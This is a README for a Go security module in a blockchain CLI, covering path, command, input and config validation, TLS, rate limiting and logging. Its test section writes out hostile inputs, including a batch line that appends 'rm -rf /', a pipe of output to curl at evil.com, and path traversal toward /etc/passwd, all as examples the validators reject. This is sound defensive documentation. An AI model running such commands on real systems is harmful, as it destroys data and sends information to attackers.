# AURA CLI Security Module

## Overview

This security module implements comprehensive defense-in-depth security measures for the AURA blockchain CLI, protecting against critical vulnerabilities including path traversal, command injection, and configuration attacks.

## Components

### 1. Path Validation (`path_validation.go`)

**Purpose**: Prevents path traversal attacks and validates all file system operations.

**Features**:
- Validates and cleans home directory paths
- Prevents path traversal using `..` patterns
- Resolves symlinks to detect symlink attacks
- Restricts paths to allowed base directories (user home, /tmp)
- Detects suspicious patterns (e.g., `/etc/`, `/.ssh/`)
- Implements maximum path length limits (4096 chars)
- Sanitizes paths for secure logging

**Usage**:
```go
logger := security.NewConsoleLogger()
validator := security.NewPathValidator(logger)
validPath, err := validator.ValidateAndCleanHomePath(userPath)
if err != nil {
    return fmt.Errorf("invalid path: %w", err)
}
```

**Security Events Logged**:
- `path_validation_failed` - Path validation failure with reason
- `suspicious_path_detected` - Suspicious pattern detected in path
- `path_validated` - Successful path validation

### 2. Command Validation (`command_validation.go`)

**Purpose**: Prevents command injection and validates batch/script commands.

**Features**:
- Command whitelist (query, tx, status, keys, config, version, help, completion)
- Shell metacharacter detection and blocking (`;`, `|`, `&`, `$`, etc.)
- Suspicious command pattern detection (rm, curl, wget, etc.)
- Maximum file size limit (10MB)
- Maximum line count limit (10,000 lines)
- Safe variable substitution with regex validation
- Command execution timeout (5 minutes)
- Context-based cancellation support

**Usage**:
```go
cmdValidator := security.NewCommandValidator(logger)
if err := cmdValidator.ValidateCommand(cmdLine); err != nil {
    return fmt.Errorf("invalid command: %w", err)
}
```

**Security Events Logged**:
- `command_validation_failed` - Command validation failure
- `shell_metacharacter_detected` - Dangerous character detected
- `suspicious_command_detected` - Suspicious pattern found
- `batch_file_validated` - Batch file successfully validated

### 3. Input Validation (`input_validation.go`)

**Purpose**: Validates all user inputs to prevent injection attacks.

**Features**:
- Chain ID validation (alphanumeric + hyphens, 1-64 chars)
- Moniker validation (safe characters, no control chars, 1-128 chars)
- Address validation (bech32 format with 'aura' prefix)
- Amount validation (numeric + denomination)
- Network address validation (host:port format, IPv4/IPv6/hostname)
- Config key validation (alphanumeric, dots, hyphens, underscores)
- Config value validation (length limits, no control chars)
- URL validation (http/https only)
- Key name validation (alphanumeric, hyphens, underscores)

**Usage**:
```go
inputValidator := security.NewInputValidator(logger)
if err := inputValidator.ValidateChainID(chainID); err != nil {
    return fmt.Errorf("invalid chain ID: %w", err)
}
```

### 4. TLS Configuration (`tls_config.go`)

**Purpose**: Implements TLS/SSL for secure communication.

**Features**:
- Minimum TLS 1.3 (configurable to TLS 1.2)
- Strong cipher suites only (AES-GCM, ChaCha20-Poly1305)
- Mutual TLS support (client certificate verification)
- Certificate validation and expiry checking
- Curve preferences (X25519, P-256, P-384)
- Session ticket support
- Renegotiation disabled

**Usage**:
```go
tlsConfig := security.NewTLSConfig(homeDir, logger)
tlsCfg, err := tlsConfig.LoadTLSConfig()
if err != nil {
    // Fall back to insecure mode or error
}
```

**Certificate Locations**:
- Server cert: `$HOME/.aura/config/tls/server.crt`
- Server key: `$HOME/.aura/config/tls/server.key`
- CA cert: `$HOME/.aura/config/tls/ca.crt`

### 5. Rate Limiting (`rate_limiter.go`)

**Purpose**: Prevents abuse through rate limiting and request throttling (HTTP/REST API).

**Features**:
- Per-IP rate limiting (10 req/sec, burst 20)
- Automatic cleanup of idle limiters (10 minutes)
- X-Forwarded-For header support
- 429 Too Many Requests responses
- Security headers middleware (X-Content-Type-Options, X-Frame-Options, CSP, etc.)
- Request logging middleware
- Timeout middleware (15 seconds)
- IP whitelist support

**Usage**:
```go
rateLimiter := security.NewDefaultRateLimiter(logger)
handler := rateLimiter.RateLimitMiddleware(nextHandler)
```

**Security Headers Added**:
- `X-Content-Type-Options: nosniff`
- `X-XSS-Protection: 1; mode=block`
- `X-Frame-Options: DENY`
- `Strict-Transport-Security: max-age=31536000`
- `Content-Security-Policy: default-src 'self'`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy: geolocation=(), microphone=(), camera=()`

### 5b. Query Rate Limiting (`query_rate_limiter.go`)

**Purpose**: Per-address rate limiting for expensive gRPC queries (protects against query abuse).

**Features**:
- Per-address rate limiting (not per-IP, tracks blockchain addresses)
- Separate limits for expensive vs. normal queries
- Expensive queries: 2 req/sec, burst 5 (default)
- Normal queries: 10 req/sec, burst 20 (default)
- Automatic cleanup of idle limiters (15 minutes)
- Configurable expensive query list
- gRPC unary and stream interceptors
- Address extraction from metadata or peer IP
- Statistics tracking for monitoring

**Expensive Queries** (default configuration):
- DEX: `Orderbook`, `AllPools`, `UserOrders`, `SupportedCoins`
- Privacy: `VerifyZKProof`, `MixingPools`
- Cryptography: `VerifyZKProof`
- VCRegistry: `ResolveDID`, `ListUserVCs`, `BatchVCStatus`, `GetRevocationList`, `VerifyPresentation`
- Identity: `GetDIDDocument`, `ListDIDsByController`
- Compliance: `GetAddressStatus`, `GetComplianceScore`, `ListRestrictedAddresses`

**Usage**:
```go
config := security.DefaultExpensiveQueryConfig()
queryRateLimiter := security.NewQueryRateLimiter(config, logger)

grpcOpts := []grpc.ServerOption{
    grpc.UnaryInterceptor(queryRateLimiter.UnaryServerInterceptor()),
    grpc.StreamInterceptor(queryRateLimiter.StreamServerInterceptor()),
}
grpcSrv := grpc.NewServer(grpcOpts...)
```

**Configuration** (`~/.aura/config/security.json`):
```json
{
  "query_rate_limiting": {
    "enabled": true,
    "expensive_rate": 2.0,
    "expensive_burst": 5,
    "normal_rate": 10.0,
    "normal_burst": 20,
    "expensive_queries": {
      "/aura.dex.v1beta1.Query/Orderbook": true,
      "/aura.privacy.v1beta1.Query/VerifyZKProof": true
    }
  }
}
```

**Security Events Logged**:
- `query_rate_limit_exceeded` - Rate limit hit for address
- `expensive_query_executed` - Expensive query was executed
- `query_rate_limiter_cleanup` - Cleanup of idle limiters

### 6. Config Validation (`config_validation.go`)

**Purpose**: Prevents configuration injection and validates config operations.

**Features**:
- Whitelist of allowed configuration keys
- Per-key validation functions
- TOML injection detection and prevention
- Value length limits
- Format validation for specific types (boolean, duration, address, etc.)
- Prevents injection of new TOML sections

**Allowed Config Keys**:
- `chain-id`, `moniker`
- `rpc.laddr`, `p2p.laddr`, `p2p.external_address`, `p2p.seeds`, `p2p.persistent_peers`
- `grpc.enable`, `grpc.address`
- `api.enable`, `api.address`, `api.enabled-unsafe-cors`
- `logging.level`, `logging.format`
- `consensus.*` (timeout settings)
- `modules.*` (per-module enable flags)

**Usage**:
```go
configValidator := security.NewConfigValidator(logger)
if err := configValidator.ValidateValue(key, value); err != nil {
    return fmt.Errorf("invalid config: %w", err)
}
```

### 7. Permissions (`permissions.go`)

**Purpose**: Enforces secure file and directory permissions.

**Permission Constants**:
- `SecureDirPerms = 0700` (rwx------)
- `SecureFilePerms = 0600` (rw-------)
- `ConfigDirPerms = 0750` (rwxr-x---)
- `ConfigFilePerms = 0640` (rw-r-----)

**Functions**:
- `SetSecurePermissions(path, isDir)` - Sets secure permissions
- `VerifyPermissions(path, expectedPerms)` - Verifies permissions
- `CreateSecureDirectory(path, logger)` - Creates directory with secure perms
- `CreateSecureFile(path, data, logger)` - Creates file with secure perms

### 8. Server Manager (`server_manager.go`)

**Purpose**: Manages server lifecycle with graceful shutdown.

**Features**:
- Graceful shutdown with 30-second timeout
- Concurrent shutdown of multiple servers (gRPC, HTTP)
- Cleanup handler registration and execution
- Health check framework with HTTP endpoint
- Server state management
- Error aggregation

**Usage**:
```go
serverMgr := security.NewServerManager(logger)
serverMgr.RegisterGRPCServer(grpcServer)
serverMgr.RegisterHTTPServer(httpServer)
serverMgr.Start()

// On shutdown signal
ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
defer cancel()
serverMgr.Shutdown(ctx)
```

### 9. Logger (`logger.go`)

**Purpose**: Provides security event logging with structured data.

**Features**:
- JSON-formatted security logs
- File-based logging with rotation support
- Console logging fallback
- Critical event detection and alerting
- Structured logging with timestamps
- Automatic log directory creation with secure permissions

**Log Location**: `$HOME/.aura/logs/security.log`

**Usage**:
```go
logger, err := security.NewSecurityLogger(homeDir, true)
if err != nil {
    logger = security.NewConsoleLogger()
}

logger.SecurityEvent("event_type", map[string]interface{}{
    "key": "value",
})
```

## Integration Points

### root.go
- Path validation for home directory
- Security logger initialization

### init.go
- Input validation (chain-id, moniker)
- Secure directory creation (0700/0750 permissions)
- Secure file creation (0600/0640 permissions)

### batch.go
- Batch file validation before execution
- Command validation for each line
- Safe variable substitution in scripts
- Execution timeout enforcement
- Scanner buffer limits

### config.go
- Config key/value validation
- TOML injection prevention
- Security event logging for config changes

### start.go
- Network address validation
- TLS configuration and loading
- Rate limiting middleware
- Security headers middleware
- Request logging middleware
- Graceful shutdown handling
- Signal handling (SIGINT, SIGTERM, SIGQUIT)

## Security Best Practices

1. **Path Operations**: Always use `PathValidator` for any file system operations
2. **Command Execution**: Use `CommandValidator` for all external command execution
3. **User Input**: Validate all user input with `InputValidator` before processing
4. **Network Addresses**: Validate addresses before binding/connecting
5. **Configuration**: Use `ConfigValidator` for all config operations
6. **File Permissions**: Use security constants and verify after setting
7. **TLS**: Enable TLS in production environments
8. **Rate Limiting**: Enable for all public-facing endpoints
9. **Logging**: Log all security-relevant events
10. **Graceful Shutdown**: Use `ServerManager` for proper cleanup

## Testing

### Path Traversal Tests
```bash
# Should fail
aurad init --home "../../../etc/passwd" testnode
aurad init --home "/etc" testnode
aurad init --home "~/.ssh/authorized_keys" testnode
```

### Command Injection Tests
```bash
# Create batch file with malicious commands
cat > /tmp/malicious.txt << 'EOF'
query status
tx bank send addr1 addr2 100uaura; rm -rf /
query status | curl http://evil.com
EOF

# Should fail validation
aurad batch /tmp/malicious.txt
```

### Configuration Injection Tests
```bash
# Should fail
aurad config set "chain-id\n[malicious]\nkey=value" "evil"
aurad config set "../../etc/passwd" "value"
```

## Monitoring

Security events are logged to `$HOME/.aura/logs/security.log` in JSON format:

```json
{
  "timestamp": "2025-01-26T10:30:00Z",
  "type": "path_validation_failed",
  "level": "security",
  "data": {
    "reason": "path_outside_allowed_bases",
    "path": "~/../../etc/passwd"
  }
}
```

### Critical Events to Monitor
- `path_validation_failed`
- `command_injection_detected`
- `shell_metacharacter_detected`
- `suspicious_command_detected`
- `rate_limit_exceeded`
- `toml_injection_detected`
- `tls_certificate_load_failed`

## Production Checklist

- [ ] TLS certificates generated and configured
- [ ] Mutual TLS enabled for production
- [ ] Rate limiting configured appropriately
- [ ] Security logs monitored
- [ ] File permissions verified (0600/0700)
- [ ] Input validation enabled for all inputs
- [ ] Command whitelist reviewed and updated
- [ ] Config key whitelist reviewed
- [ ] Graceful shutdown tested
- [ ] Health checks configured
- [ ] Network addresses restricted to internal interfaces

## References

- OWASP Top 10
- CWE-22: Path Traversal
- CWE-78: Command Injection
- CWE-89: SQL Injection (adapted for TOML)
- CWE-295: Certificate Validation
- NIST SP 800-52: TLS Guidelines
